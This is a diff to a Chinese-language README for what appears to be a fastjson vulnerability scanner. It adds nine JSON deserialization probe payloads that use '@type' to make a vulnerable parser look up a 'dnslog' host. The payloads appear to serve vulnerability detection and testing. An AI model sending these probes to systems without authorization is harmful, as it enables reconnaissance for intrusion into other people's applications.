@@ -5,7 +5,15 @@
 使用的poc如下：
 
 ```
-fastjson_poc = '{{"@type":"java.net.URL","val":"http://%s"}:"x"}' % val
+            """{"rand":{"@type":"java.net.InetAddress","val":"dnslog"}}""",
+            """{"rand":{"@type":"java.net.Inet4Address","val":"dnslog"}}""",
+            """{"rand":{"@type":"java.net.Inet6Address","val":"dnslog"}}""",
+            """{"rand":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}""",
+            """{"rand":{"@type":"java.net.URL","val":"http://dnslog"}}""",
+            """{"rand":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}""",
+            """{"rand":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}""",
+            """{"rand":Set[{"@type":"java.net.URL","val":"http://dnslog"}""",
+            """{"rand":{"@type":"java.net.URL","val":"http://dnslog"}:0""",
 ```
 
 ### 优点
